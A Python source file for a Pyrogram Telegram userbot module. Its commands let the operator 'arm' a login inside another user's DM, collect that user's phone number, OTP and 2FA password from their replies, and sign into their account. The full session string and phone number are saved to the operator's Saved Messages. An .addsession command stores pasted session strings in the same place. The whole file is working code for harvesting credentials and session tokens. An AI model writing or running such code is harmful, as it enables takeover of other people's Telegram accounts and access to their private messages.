"""
.login / .addsession / .cancellogin / .mylogin
OWNER + sudo. Session → Saved Messages only.
"""
from typing import Any

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import (
    PhoneCodeInvalid, PhoneCodeExpired, PhoneNumberInvalid,
    PhoneNumberBanned, SessionPasswordNeeded, PasswordHashInvalid, FloodWait,
)

from core.clients import app
from config import API_ID, API_HASH, OWNER_ID
from modules.owner.sudoers import ub_cmd, SUDO_USERS

_LOGIN: dict[int, dict[str, Any]] = {}
_ARMED: set[int] = set()


def _is_op(uid: int | None) -> bool:
    if uid is None:
        return False
    if OWNER_ID and uid == OWNER_ID:
        return True
    return uid in SUDO_USERS


async def _send_to_saved(text: str):
    try:
        await app.send_message("me", text)
        return True
    except Exception as e:
        print(f"[login] Saved fail: {e}")
        return False


async def _cleanup_temp(state: dict):
    temp = state.get("temp_client")
    if temp:
        try:
            await temp.disconnect()
        except Exception:
            pass
        state["temp_client"] = None


@app.on_message(ub_cmd("login") & filters.me)
async def login_cmd(client, message: Message):
    me = await client.get_me()
    op_id = message.from_user.id if message.from_user else me.id
    if not _is_op(op_id) and op_id != me.id:
        return

    if message.chat.type.name.lower() != "private":
        _ARMED.add(op_id)
        await message.reply_text(
            "<b>LOGIN ARMED</b>\n\n"
            "Ab jis user ke <b>DM</b> me jao aur <code>.login</code> likho.\n"
            "Session sirf <b>Saved Messages</b> me save hogi.\n"
            "Cancel: <code>.cancellogin</code>"
        )
        return

    chat_id = message.chat.id
    if chat_id in _LOGIN:
        await _cleanup_temp(_LOGIN[chat_id])

    _LOGIN[chat_id] = {
        "step": "phone", "op_id": op_id,
        "phone": None, "phone_code_hash": None, "temp_client": None,
    }
    _ARMED.discard(op_id)
    await message.reply_text(
        "<b>LOGIN STARTED</b>\n\n"
        "Step 1: Phone <code>+91XXXXXXXXXX</code>\n"
        "Phir OTP → password (agar 2FA)\n\n"
        "Session sirf Saved Messages me.\n"
        "Cancel: <code>.cancellogin</code>"
    )


@app.on_message(ub_cmd("cancellogin", "logoutlogin") & filters.me)
async def cancellogin_cmd(client, message: Message):
    op_id = message.from_user.id if message.from_user else 0
    _ARMED.discard(op_id)
    chat_id = message.chat.id
    if chat_id in _LOGIN:
        await _cleanup_temp(_LOGIN[chat_id])
        del _LOGIN[chat_id]
        await message.reply_text("Login cancel.")
    else:
        await message.reply_text("Koi active login nahi.")


@app.on_message(ub_cmd("addsession") & filters.me)
async def addsession_cmd(client, message: Message):
    parts = (message.text or "").split(None, 1)
    if len(parts) < 2:
        await message.reply_text("Usage: <code>.addsession SESSION_STRING</code>")
        return
    session = parts[1].strip()
    if len(session) < 20:
        await message.reply_text("Session bahut short.")
        return
    status = await message.reply_text("Session check…")
    temp = Client(
        name="validate_sess", api_id=API_ID, api_hash=API_HASH,
        session_string=session, in_memory=True,
    )
    try:
        await temp.connect()
        me = await temp.get_me()
        await temp.disconnect()
        name = me.first_name or ""
        uname = f"@{me.username}" if me.username else "—"
        body = (
            f"<b>SESSION SAVED</b>\n"
            f"{name} | {uname} | <code>{me.id}</code>\n\n"
            f"<code>{session}</code>"
        )
        ok = await _send_to_saved(body)
        await status.edit_text(
            f"OK — <b>{name}</b> (<code>{me.id}</code>)\n"
            + ("Saved Messages me bhej diya" if ok else "Saved Messages fail")
        )
    except Exception as e:
        try:
            await temp.disconnect()
        except Exception:
            pass
        await status.edit_text(f"Invalid: <code>{type(e).__name__}: {e}</code>")
    try:
        await message.delete()
    except Exception:
        pass


@app.on_message(ub_cmd("mylogin", "logins") & filters.me)
async def mylogin_cmd(client, message: Message):
    await message.reply_text(
        f"<b>Login status</b>\n"
        f"Active: <code>{len(_LOGIN)}</code> · Armed: <code>{len(_ARMED)}</code>\n"
        f"<code>.login</code> <code>.addsession</code> <code>.cancellogin</code>"
    )


@app.on_message(filters.private & filters.text, group=5)
async def login_steps(client, message: Message):
    chat_id = message.chat.id
    state = _LOGIN.get(chat_id)
    if not state:
        return
    text = (message.text or "").strip()
    if not text or text.startswith((".", "!")):
        return
    step = state.get("step")

    if step == "phone":
        phone = text.replace(" ", "").replace("-", "")
        if not phone.startswith("+") or not phone[1:].isdigit() or len(phone) < 10:
            await message.reply_text("Invalid phone. Example: <code>+919876543210</code>")
            return
        status = await message.reply_text("Code bhej rahe hain…")
        temp = Client(
            name=f"login_{chat_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True,
        )
        try:
            await temp.connect()
            sent = await temp.send_code(phone)
            state["phone"] = phone
            state["phone_code_hash"] = sent.phone_code_hash
            state["temp_client"] = temp
            state["step"] = "code"
            await status.edit_text("Code bhej diya. OTP yahan bhejo.")
        except FloodWait as e:
            await _cleanup_temp({"temp_client": temp})
            await status.edit_text(f"FloodWait: {e.value}s")
            _LOGIN.pop(chat_id, None)
        except (PhoneNumberInvalid, PhoneNumberBanned) as e:
            await _cleanup_temp({"temp_client": temp})
            await status.edit_text(f"Phone error: {type(e).__name__}")
        except Exception as e:
            await _cleanup_temp({"temp_client": temp})
            await status.edit_text(f"<code>{type(e).__name__}: {e}</code>")
            _LOGIN.pop(chat_id, None)
        return

    if step == "code":
        code = text.replace(" ", "").replace("-", "")
        if not code.isdigit():
            await message.reply_text("Sirf OTP digits bhejo.")
            return
        temp = state.get("temp_client")
        if not temp:
            await message.reply_text("Session lost. <code>.login</code>")
            _LOGIN.pop(chat_id, None)
            return
        status = await message.reply_text("Sign in…")
        try:
            await temp.sign_in(
                phone_number=state["phone"],
                phone_code_hash=state["phone_code_hash"],
                phone_code=code,
            )
            sess = await temp.export_session_string()
            me = await temp.get_me()
            await temp.disconnect()
            state["temp_client"] = None
            _LOGIN.pop(chat_id, None)
            name = me.first_name or ""
            body = (
                f"<b>NEW SESSION</b>\n{name} | <code>{me.id}</code>\n"
                f"<code>{state['phone']}</code>\n\n<code>{sess}</code>"
            )
            ok = await _send_to_saved(body)
            await status.edit_text(
                f"Login success! {name} <code>{me.id}</code>\n"
                + ("→ Saved Messages" if ok else "Saved fail")
            )
        except SessionPasswordNeeded:
            state["step"] = "password"
            await status.edit_text("2FA ON — cloud password bhejo")
        except PhoneCodeInvalid:
            await status.edit_text("OTP galat. Dobara bhejo.")
        except PhoneCodeExpired:
            await _cleanup_temp(state)
            _LOGIN.pop(chat_id, None)
            await status.edit_text("OTP expire. <code>.login</code> dobara.")
        except Exception as e:
            await _cleanup_temp(state)
            _LOGIN.pop(chat_id, None)
            await status.edit_text(f"<code>{type(e).__name__}: {e}</code>")
        return

    if step == "password":
        temp = state.get("temp_client")
        if not temp:
            await message.reply_text("Session lost. <code>.login</code>")
            _LOGIN.pop(chat_id, None)
            return
        status = await message.reply_text("2FA check…")
        try:
            await temp.check_password(text)
            sess = await temp.export_session_string()
            me = await temp.get_me()
            await temp.disconnect()
            state["temp_client"] = None
            _LOGIN.pop(chat_id, None)
            name = me.first_name or ""
            body = (
                f"<b>NEW SESSION + 2FA</b>\n{name} | <code>{me.id}</code>\n"
                f"\n<code>{sess}</code>"
            )
            ok = await _send_to_saved(body)
            await status.edit_text(
                f"Login success! {name} <code>{me.id}</code>\n"
                + ("→ Saved Messages" if ok else "Saved fail")
            )
        except PasswordHashInvalid:
            await status.edit_text("Password galat. Dobara bhejo.")
        except Exception as e:
            await _cleanup_temp(state)
            _LOGIN.pop(chat_id, None)
            await status.edit_text(f"<code>{type(e).__name__}: {e}</code>")
